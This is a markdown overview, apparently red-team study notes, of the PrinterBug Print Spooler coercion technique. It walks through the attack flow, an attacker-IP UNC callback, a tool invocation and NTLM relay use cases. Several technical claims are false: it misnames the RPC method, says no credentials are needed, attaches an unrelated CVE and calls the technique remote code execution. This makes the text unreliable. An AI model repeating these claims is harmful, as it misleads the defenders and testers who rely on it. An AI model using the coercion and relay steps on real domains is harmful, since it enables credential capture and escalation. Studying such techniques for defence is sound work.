# PrinterBug — Overview

> 🔴 **Red Flag Principle:** PrinterBug (CVE-2019-1350, MS-RPRN) is **the oldest, most reliable RPC coercion exploit** — the Print Spooler service has been a standard Windows component since Windows 3.1, and the vulnerable `RpcRemoteFindFirstPrinter` RPC method is virtually never disabled. The UNC path callback is the strongest forensic signal.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

PrinterBug originated from **Lee Christensen** (@tifkin_) and published under `leechristensen/SpoolSample`, licensed under **MIT**. The original tool is a .NET binary; several Python reimplementations exist (e.g., in Impacket examples, standalone `PrinterBug.py`).

Verified against the original SpoolSample source:

- **Initial disclosure (2019-06, CVE-2019-1350)** — Remote Code Execution via Print Spooler RPC coercion.
- **Stable implementation** — minimal changes needed; the vulnerability is deep in the Print Spooler architecture.
- **Still unpatched on many systems** — organizations often miss this CVE in patch management (Print Spooler is perceived as low-risk).

**Design philosophy:** Like PetitPotam, PrinterBug is **single-purpose** (one CVE, one RPC method). Its strength is **extreme reliability** — the Print Spooler is almost never disabled, making this the most consistently successful coercion technique across enterprise networks.

## How It Works

PrinterBug exploits **MS-RPRN** (Print Server Remote Procedure Call), specifically the `RpcRemoteFindFirstPrinter` method, which allows (often without authentication) a caller to enumerate remote printers on a target.

### The Print Spooler Coercion Flow

```
1. Attacker calls RpcRemoteFindFirstPrinter RPC on target DC
2. Method: RpcRemoteFindFirstPrinter(
     <PRINTER_HANDLE> pointing to attacker-specified UNC path
   )
3. Target's Print Spooler service processes the request
4. To find the "printer" at the specified UNC, it initiates SMB connection to attacker
5. Target authenticates with its machine account (SYSTEM)
6. Attacker (via Responder/ntlmrelayx) captures/relays the NTLM hash
```

### UNC Path Injection

Similar to EFS, the attacker embeds a UNC path:

```
\\192.168.1.99\printer$\spooler
```

The Print Spooler attempts to access this path, triggering the authentication callback.

## Techniques / Protocols Used

| Protocol | Detail |
|---|---|
| **MS-RPRN** | Print Server Remote Procedure Call |
| **RPC/DCERPC** | Binary RPC protocol over SMB / port 135 |
| **SMB** | Server Message Block — UNC path connection |
| **NTLM** | Challenge/response authentication over SMB |

## Command-Line Switches — Quick Reference

PrinterBug (SpoolSample .NET version) and Python reimplementations have minimal CLI:

| Parameter | Purpose |
|---|---|
| `<target>` | Target DC or server IP/hostname |
| `<attacker>` | Attacker's IP (where Print Spooler connects back) |
| `-port` | RPC port (default 135 or 445) |
| `-v` | Verbose output |

**Python variant (if used):**
```bash
python3 printerbug.py <target> <attacker-ip>
```

## Quick Use-Case List

1. **Unauthenticated Print Spooler coercion** — No credentials needed; works on virtually all DCs.
2. **Machine account credential capture** — DC$ authentication captured for relay/cracking.
3. **Reliable coercion fallback** — When EFS fails, PrinterBug almost always works.
4. **Batch coercion** — Multiple targets in sequence.
5. **SMB relay to LDAP** — Coerce DC, relay to LDAP for privilege escalation.
6. **SMB relay to SMB** — Coerce DC, relay to file server for administrative access.
7. **Credential harvesting** — Capture NTLM hashes for offline cracking.
8. **Cross-forest attacks** — Coerce DC in trusted forest, relay to parent forest.

## Prerequisites

1. **Network access to Print Spooler RPC** — Port 135 (Endpoint Mapper) or port 445 (if RPC-over-SMB).
2. **Print Spooler service running** — Default on all Windows DCs (only disabled by explicit hardening, rare).
3. **Listener running** — Responder or ntlmrelayx on attacker host.
4. **Attacker IP routable** — Target must reach attacker's IP.
5. **SMB port 445 open** — For the UNC callback.
6. **No RPC access controls** — Most targets allow unauthenticated RPC calls to Print Spooler.

---

**Next:** See `02 - Hands-On Use Cases.md`.
